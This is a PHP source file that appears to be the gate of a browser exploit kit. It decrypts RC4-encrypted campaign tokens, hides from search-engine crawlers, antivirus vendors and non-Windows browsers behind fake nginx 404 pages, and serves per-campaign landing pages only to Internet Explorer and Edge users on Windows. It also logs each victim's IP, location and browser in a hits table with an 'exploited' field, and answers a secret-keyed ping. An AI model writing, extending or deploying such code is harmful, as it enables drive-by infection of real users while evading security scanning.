<?php

class Proxy_Core
{
    private static $S = array();

    function __construct()
    {
        register_shutdown_function(array(
            $this,
            'fatalErrorShutdownHandler'
        ));
        set_error_handler(array(
            $this,
            'errorHandler'
        ));
        include("index/inc/config.php");
        $this->config   = $config;
        $this->dbh      = $this->connect();

    }

    private function connect()
    {
        try {
            $dbh = new PDO('mysql:host=' . $this->config['mysql']['host'] . ';dbname=' . $this->config['mysql']['db'], $this->config['mysql']['user'], $this->config['mysql']['pass']);
            $dbh = null;
        }
        catch (PDOException $e) {
            $this->logError('Unable to establish a database connection: ' . $e->getMessage());
        }
        $dbh = new PDO('mysql:host=' . $this->config['mysql']['host'] . ';dbname=' . $this->config['mysql']['db'], $this->config['mysql']['user'], $this->config['mysql']['pass']);
        return $dbh;
    }



    public function errorHandler($code, $message, $file, $line)
    {
        $source = "[" . $_SERVER['HTTP_USER_AGENT'] . " / " . $this->getIp() . "]";
        $data   = 'Error Type: ' . $code . ' Message: ' . $message . ' In file: ' . $file . ' On line: ' . $line . ' Source: ' . $source;
        #$msg = $this->safe_b64encode($this->encrypt($this->config['rc4']['key'], $data));
        if (!empty($message) && !empty($code)) {
            $msg = $data;
            $this->logError($msg);
            exit();
        }
    }

    public function fatalErrorShutdownHandler()
    {
        $last_error = error_get_last();
        $this->errorHandler($last_error['type'], $last_error['message'], $last_error['file'], $last_error['line']);
    }

    private function getUa()
    {
        if (!empty($_SERVER['HTTP_USER_AGENT'])) {
            return $_SERVER['HTTP_USER_AGENT'];
        } else {
            return "Not set";
        }
    }

    private function getRef()
    {
        if (!empty($_SERVER['HTTP_REFERER'])) {
            return $_SERVER['HTTP_REFERER'];
        } else {
            return "Direct hit";
        }
    }

    function chkBad($d, $geo)
    {
      $is_bot = 0;
      $user_agent = $_SERVER['HTTP_USER_AGENT'];
      $stringData = "\n";
      $virgule = ",";
      $ariurl = $_SERVER['REQUEST_URI'];
      $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);


	  $bad_robots = array("aolbuild","Accoona-AI-Agent","AOLspider","bingpreview","baidu","BlackBerry","bot@bot.bot","craw","crawl","CazoodleBot","CFNetwork","ConveraCrawler","Cynthia","duckduckgo","Dillo","discoveryengine.com","DoCoMo","ee://aol/http","exactseek.com","frame","fiddler", "findlinks","fast.no","FAST MetaWeb","FavOrg","FS-Web", "Gigabot","GOFORITBOT","gonzo","Googlebot-Image","holmes","HTC_P4350","HTML2JPG Blackbox","http://www.uni-koblenz.de/~flocke/robot-info.txt","iArchitect","ia_archiver","ICCrawler","ichiro","IEAutoDiscovery","ilial","IRLbot","Keywen","kkliihoihn nlkio","larbin","libcurl-agent","libwww-perl","Mediapartners-Google","Metasearch Crawler","MJ12bot","T-H-U-N-D-E-R-S-T-O-N-E","voodoo-it","www.aramamotorusearchengine.com","archive.org_bot","Teoma","Ask Jeeves","AvantGo","Exabot-Images","Exabot","Google Keyword Tool","Googlebot","heritrix","www.livedir.net","iCab","Interseek","jobs.de","MJ12bot","pmoz.info","SnapPreviewBot","Slurp","Danger hiptop","MQBOT","msnbot-media","msnbot","MSRBOT","NetObjects Fusion","nicebot","nrsbot","Ocelli","Pagebull","PEAR HTTP_Request class","Pluggd/Nutch","psbot","Python-urllib","Regiochannel","safe","slurp","SearchEngine","Seekbot","segelsuche.de","Semager","ShopWiki","Snappy","Speedy Spider","sproose","spider","telerik","TurnitinBot","Twiceler","VB Project","VisBot","voyager","VWBOT","Wells Search","West Wind","Wget","WWW-Mechanize","www.show-tec.net","xxyyzz","yacybot","Yahoo-MMCrawler","yetibot","yandex");
     foreach ($bad_robots as $spider)
    {
        $spider = '#' . $spider . '#i';
        if (preg_match($spider, $_SERVER["HTTP_USER_AGENT"])!= FALSE)
        {
          $is_bot = 1;

        }
              }

	     $banned_hosts = array("serve","clonix","avast","norton","router","trendmicro","sever","srv","root","admin","211.173.160.*","host-92-30-249-97.as13285.net","server","vps","5ad2b147.bb.sky.com","cloud","google","bot","adm1n","adm","null","localhost","0.0.0","mail");

	$banned_browsers = array("0000000","mail","frame","bot","kaspersky","server","Mac","Apple","Linux","firefox","cloud","router","sever","srv","root","admin","opera","safari");
         $xbrowser = $user_agent;
         foreach($banned_browsers as $banned_browser) {
         if ((stristr($xbrowser, $banned_browser) != FALSE) && ((stristr($xbrowser, "NT 10") == FALSE))) {
           header('HTTP/1.1 404 Not Found', true, 404);
           echo '<html>
             <head><title>404 Not Found</title></head>
             <body bgcolor="white">
             <center><h1>404 Not Found</h1></center>
             <hr><center>nginx/1.6.2</center>
             </body>
             </html>';
               die();
              }
         }
            foreach($banned_hosts as $banned_host) {
            	if (stristr($hostname, $banned_host) != FALSE) {
                $is_bot = 1;
              }
            }


      if($is_bot == 1)
      {
        header('HTTP/1.1 404 Not Found', true, 404);
        echo '<html>
          <head><title>404 Not Found</title></head>
          <body bgcolor="white">
          <center><h1>404 Not Found</h1></center>
          <hr><center>nginx/1.6.3</center>
          </body>
          </html>';
          $this->hits($d['user_id'], $d['flow_id'], $_SERVER['REMOTE_ADDR'], $user_agent, $referer, $geo['country'], $geo['city'], "Bad Bot", "Bad Bot");
          die();
      }

    }
    private function getIp()
    {

        $this->ip = $_SERVER['REMOTE_ADDR'];
        if ($this->ip) {
            if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $this->ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $this->ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
                $this->ip = $_SERVER['HTTP_X_FORWARDED'];
            } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
                $this->ip = $_SERVER['HTTP_FORWARDED_FOR'];
            } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
                $this->ip = $_SERVER['HTTP_FORWARDED'];
            } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
                $this->ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
            }

            return $this->ip;
        }
        // There might not be any data
        return false;
    }

    private function getBr($u_agent = null)
    {
        if (is_null($u_agent) && isset($_SERVER['HTTP_USER_AGENT']))
            $u_agent = $_SERVER['HTTP_USER_AGENT'];

        $platform = null;
        $browser  = null;
        $version  = null;

        $empty = array(
            'platform' => $platform,
            'browser' => $browser,
            'version' => $version
        );

        if (!$u_agent)
            return $empty;

        if (preg_match('/\((.*?)\)/im', $u_agent, $parent_matches)) {

            preg_match_all('/(?P<platform>Android|CrOS|iPhone|iPad|Linux|Macintosh|Windows(\ Phone\ OS)?|Silk|linux-gnu|BlackBerry|PlayBook|Nintendo\ (WiiU?|3DS)|Xbox)
				(?:\ [^;]*)?
				(?:;|$)/imx', $parent_matches[1], $result, PREG_PATTERN_ORDER);

            $priority           = array(
                'Android',
                'Xbox'
            );
            $result['platform'] = array_unique($result['platform']);
            if (count($result['platform']) > 1) {
                if ($keys = array_intersect($priority, $result['platform'])) {
                    $platform = reset($keys);
                } else {
                    $platform = $result['platform'][0];
                }
            } elseif (isset($result['platform'][0])) {
                $platform = $result['platform'][0];
            }
        }

        if ($platform == 'linux-gnu') {
            $platform = 'Linux';
        } elseif ($platform == 'CrOS') {
            $platform = 'Chrome OS';
        }

        preg_match_all('%(?P<browser>Camino|Kindle(\ Fire\ Build)?|Firefox|Iceweasel|Safari|MSIE|Trident/.*rv|AppleWebKit|Chrome|IEMobile|Opera|OPR|Silk|Lynx|Midori|Version|Wget|curl|NintendoBrowser|PLAYSTATION\ (\d|Vita)+)
				(?:\)?;?)
				(?:(?:[:/ ])(?P<version>[0-9A-Z.]+)|/(?:[A-Z]*))%ix', $u_agent, $result, PREG_PATTERN_ORDER);


        // If nothing matched, return null (to avoid undefined index errors)
        if (!isset($result['browser'][0]) || !isset($result['version'][0])) {
            return $empty;
        }

        $browser = $result['browser'][0];
        $version = $result['version'][0];

        $find = function($search, &$key) use ($result)
        {
            $xkey = array_search(strtolower($search), array_map('strtolower', $result['browser']));
            if ($xkey !== false) {
                $key = $xkey;

                return true;
            }

            return false;
        };

        $key = 0;
        if ($browser == 'Iceweasel') {
            $browser = 'Firefox';
        } elseif ($find('Playstation Vita', $key)) {
            $platform = 'PlayStation Vita';
            $browser  = 'Browser';
        } elseif ($find('Kindle Fire Build', $key) || $find('Silk', $key)) {
            $browser  = $result['browser'][$key] == 'Silk' ? 'Silk' : 'Kindle';
            $platform = 'Kindle Fire';
            if (!($version = $result['version'][$key]) || !is_numeric($version[0])) {
                $version = $result['version'][array_search('Version', $result['browser'])];
            }
        } elseif ($find('NintendoBrowser', $key) || $platform == 'Nintendo 3DS') {
            $browser = 'NintendoBrowser';
            $version = $result['version'][$key];
        } elseif ($find('Kindle', $key)) {
            $browser  = $result['browser'][$key];
            $platform = 'Kindle';
            $version  = $result['version'][$key];
        } elseif ($find('OPR', $key)) {
            $browser = 'Opera Next';
            $version = $result['version'][$key];
        } elseif ($find('Opera', $key)) {
            $browser = 'Opera';
            $find('Version', $key);
            $version = $result['version'][$key];
        } elseif ($find('Midori', $key)) {
            $browser = 'Midori';
            $version = $result['version'][$key];
        }elseif (preg_match('/Edge[^"]+/m', $u_agent, $match)){
          $platform = "Windows";
          $browser = explode('/',$match[0])[0];
          $version = explode('/',$match[0])[1];
        } elseif ($find('Chrome', $key)) {
            $browser = 'Chrome';
            $version = $result['version'][$key];
        } elseif ($browser == 'AppleWebKit') {
            if (($platform == 'Android' && !($key = 0))) {
                $browser = 'Android Browser';
            } elseif ($platform == 'BlackBerry' || $platform == 'PlayBook') {
                $browser = 'BlackBerry Browser';
            } elseif ($find('Safari', $key)) {
                $browser = 'Safari';
            }

            $find('Version', $key);

            $version = $result['version'][$key];
        } elseif ($browser == 'MSIE' || strpos($browser, 'Trident') !== false) {
            if ($find('IEMobile', $key)) {
                $browser = 'IEMobile';
            } else {
                $browser = 'MSIE';
                $key     = 0;
            }
            $version = $result['version'][$key];
        } elseif ($key = preg_grep("/playstation \d/i", array_map('strtolower', $result['browser']))) {
            $key = reset($key);

            $platform = 'PlayStation ' . preg_replace('/[^\d]/i', '', $key);
            $browser  = 'NetFront';
        }
        return array(
            'platform' => $platform,
            'browser' => $browser,
            'version' => $version
        );

    }

    private function getOS()
    {
        $ua     = $_SERVER['HTTP_USER_AGENT'];
        $OSList = array(
            // Match user agent string with operating systems
            'Windows 3.11' => 'Win16',
            'Windows 95' => '(Windows 95)|(Win95)|(Windows_95)',
            'Windows 98' => '(Windows 98)|(Win98)',
            'Windows NT 4.0' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)',
            'Windows 2000' => '(Windows NT 5.0)|(Windows 2000)',
            'Windows XP' => '(Windows NT 5.1)|(Windows XP)',
            'Windows Server 2003' => '(Windows NT 5.2)',
            'Windows 10' => '(Windows NT 10)',
            'Windows 8.1' => '(Windows NT 6.3)',
            'Windows 8' => '(Windows NT 6.2)',
            'Windows 7' => '(Windows NT 6.1)|(Windows NT 7.0)',
            'Windows Vista' => '(Windows NT 6.0)',
            'Windows ME' => 'Windows ME',
            'Open BSD' => 'OpenBSD',
            'Sun OS' => 'SunOS',
            'Linux' => '(Linux)|(X11)',
            'Mac OS' => '(Mac_PowerPC)|(Macintosh)',
            'QNX' => 'QNX',
            'BeOS' => 'BeOS',
            'OS/2' => 'OS\/2',
            'Search Bot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves\/Teoma)|(ia_archiver)'
        );

        foreach ($OSList as $k => $v) {
            if (preg_match('/' . $v . '/i', $ua)) {
                return $k;
            }

        }
        return 'Unknown';
    }




 private function getGeoIpCity()
    {
        $geo     = json_decode(file_get_contents("http://localhost:8080/json/" . $this->getIp()), true);
        #$geo     = json_decode(file_get_contents("http://freegeoip.net/json/" . $this->getIp()), true);
        $country = $geo['country_code'];
        $city    = $geo['city'];
        if (empty($city)) {
            $city = 'Unknown';
        }
        return array(
            'country' => $country,
            'city' => $city
        );
    }

    private static function swap(&$v1, &$v2)
    {
        $v1 = $v1 ^ $v2;
        $v2 = $v1 ^ $v2;
        $v1 = $v1 ^ $v2;
    }

    private static function KSA($key)
    {
        $idx = crc32($key);
        if (!isset(self::$S[$idx])) {
            $S = range(0, 255);
            $j = 0;
            $n = strlen($key);

            for ($i = 0; $i < 256; $i++) {
                $char = ord($key{$i % $n});
                $j    = ($j + $S[$i] + $char) % 256;
                self::swap($S[$i], $S[$j]);
            }
            self::$S[$idx] = $S;
        }
        return self::$S[$idx];
    }

    public static function encrypt($key, $data)
    {
        $S    = self::KSA($key);
        $n    = strlen($data);
        $i    = $j = 0;
        $data = str_split($data, 1);

        for ($m = 0; $m < $n; $m++) {
            $i = ($i + 1) % 256;
            $j = ($j + $S[$i]) % 256;
            self::swap($S[$i], $S[$j]);
            $char     = ord($data{$m});
            $char     = $S[($S[$i] + $S[$j]) % 256] ^ $char;
            $data[$m] = chr($char);
        }
        $data = implode('', $data);
        return $data;
    }

    public static function decrypt($key, $data)
    {
        $data = self::encrypt($key, $data);
        return $data;
    }

    public function safe_b64encode($string)
    {

        $data = base64_encode($string);
        $data = str_replace(array(
            '+',
            '/',
            '='
        ), array(
            '-',
            '_',
            ''
        ), $data);
        return $data;
    }

    public function safe_b64decode($string)
    {
        $data = str_replace(array(
            '-',
            '_'
        ), array(
            '+',
            '/'
        ), $string);
        $mod4 = strlen($data) % 4;
        if ($mod4) {
            $data .= substr('====', $mod4);
        }
        return base64_decode($data);
    }

    private function getFlows()
    {
        $stmt = $this->dbh->prepare("SELECT * FROM flows");
        $stmt->execute();
        $flows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        return $flows;
    }

    private function getTokens()
    {
        $stmt = $this->dbh->prepare("SELECT * FROM tokens");
        $stmt->execute();
        $tokens = $stmt->fetchAll(PDO::FETCH_ASSOC);
        return $tokens;
    }

    private function getToken($Token)
    {
        $stmt = $this->dbh->prepare("SELECT * FROM tokens WHERE token = :token");
        $stmt->bindParam(':token', $Token, PDO::PARAM_STR);
        $stmt->execute();
        $token = $stmt->fetch(PDO::FETCH_ASSOC);
        if (count($token) > 0) {
            return $token;
        } else {
            return false;
        }
    }

    private function compareData($input, $salt)
    {
        $h     = hash("crc32", $_SERVER['HTTP_HOST']);
        $p     = explode("|", $input);
        $flows = $this->getFlows();
        $c     = array();
        $s     = array();
        foreach ($flows as $flow) {
            $c[$flow['user_id']] = hash("fnv164", $salt . $flow['user_id']);
            $s[$flow['id']]      = hash("fnv164", $salt . $flow['id']);
        }
        $UserID = array_search($p[0], $c);
        $FlowID = array_search($p[1], $s);
        $Proxy  = $p[2];
        if ($UserID !== false && $FlowID !== false && $Proxy == $h) {
            return array(
                'user_id' => $UserID,
                'flow_id' => $FlowID
            );
        } else {
            return false;
        }
    }

    private function parseHitCall($req)
    {
        $p = explode("=", $req);
        if (count($p) != 2) {
            $this->deadPage();
        }
        $tokenraw = $this->safe_b64decode($p[0]);
        $token    = $this->decrypt($this->config['rc4']['key'], $tokenraw);
        $dataraw  = $this->safe_b64decode($p[1]);
        $data     = $this->decrypt($this->config['rc4']['key'], $dataraw);
        return array(
            'token' => $token,
            'data' => $data
        );
    }





    private function deadPage()
    {
        header('HTTP/1.1 404 Not Found', true, 404);
		echo '<html>
			<head><title>404 Not Found</title></head>
			<body bgcolor="white">
			<center><h1>404 Not Found</h1></center>
			<hr><center>nginx/1.6.2</center>
			</body>
			</html>';
		exit;

    }

	private function page404()
	{
		header('HTTP/1.1 404 Not Found', true, 404);
		echo '<html>
			<head><title>404 Not Found</title></head>
			<body bgcolor="white">
			<center><h1>404 Not Found</h1></center>
			<hr><center>nginx/1.6.2</center>
			</body>
			</html>';
		exit;
	}





    private function hits($owner, $flow, $ip, $ua, $ref, $country, $city, $browser, $os)
    {
        $stmt = $this->dbh->prepare("INSERT INTO hits (owner,flow , ip, agent, referrer, country, city, browser, exploited, timestamp, os) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute(array(
            $owner,
            $flow,
            $ip,
            $ua,
            $ref,
            $country,
            $city,
            $browser,
            0,
            time(),
            $os
        ));
    }


    public function mainServe()
    {
        $ip = $this->getIp();
        $data = $this->parseHitCall($_SERVER['QUERY_STRING']);
        if (isset($data) && count($data) == 2 && preg_match('/^[a-z0-9|]+$/i', $data['token']) && preg_match('/^[a-z0-9|]+$/i', $data['data'])) {
            $td = $this->getToken($data['token']);
            if ($td !== false && $td['timestamp'] > time()) {
                $geo = $this->getGeoIpCity();
                $br  = $this->getBr();
                $os  = $this->getOs();
                $ref = $this->getRef();
                $ua  = $this->getUa();
                $d   = $this->compareData($data['data'], $data['token']);
                $brv = $br['browser'] . " " . $br['version'];
                if ($d !== false) {
                    $this->chkBad($d, $geo);
                    $this->hits($d['user_id'], $d['flow_id'], $ip, $ua, $ref, $geo['country'], $geo['city'], $brv, $os);

                    if ($br['platform'] == "Windows" && $br['browser'] == "MSIE" && strpos($br['version'], '11') !== false) {
                        include("index/static/landing/landing".$d['flow_id'].".php");
                        exit;
                    } elseif ($br['platform'] == "Windows" && $br['browser'] == "MSIE" && strpos($br['version'], '10.') !== false) {
                        include("index/static/landing/landing".$d['flow_id'].".php");
                        exit;
                    } elseif ($br['platform'] == "Windows" && $br['browser'] == "MSIE" && strpos($br['version'], '9.') !== false) {
                        include("index/static/landing/landing".$d['flow_id'].".php");
                        exit;
                    } elseif ($br['platform'] == "Windows" && $br['browser'] == "MSIE" && strpos($br['version'], '8.') !== false) {
                        include("index/static/landing/landing".$d['flow_id'].".php");
                        exit;
                    } elseif ($br['platform'] == "Windows" && $br['browser'] == "MSIE" && strpos($br['version'], '7.') !== false) {
                        include("index/static/landing/landing".$d['flow_id'].".php");
                        exit;
                    } elseif ($br['platform'] == "Windows" && $br['browser'] == "MSIE" && strpos($br['version'], '6.') !== false) {
                        echo file_get_contents("index/static/landing/landing".$d['flow_id'].".php");
                        exit;
                    } elseif ($br['platform'] == "Windows" && $br['browser'] == "MSIE" && strpos($br['version'], '5.') !== false) {
                        include("index/static/landing/landing".$d['flow_id'].".php");
                        exit;
                    }elseif (preg_match('/Windows NT 10/i', $ua) && preg_match('/Edge/i',$ua))
                    {
                      include("index/static/landing/landing".$d['flow_id'].".php");
                    } else {
                        $this->page404();
                    }
                } else {
                    $this->deadPage();
                }
            }
        } else {
            $this->deadPage();
        }
    }
}


$a = new Proxy_Core();
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['ping']) && isset($_POST['s']) && $_POST['s'] == "XfqPIvHOQ03EYhgpbPGq") {
    echo "k!";
    exit;
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $a->mainServe();
}




?>
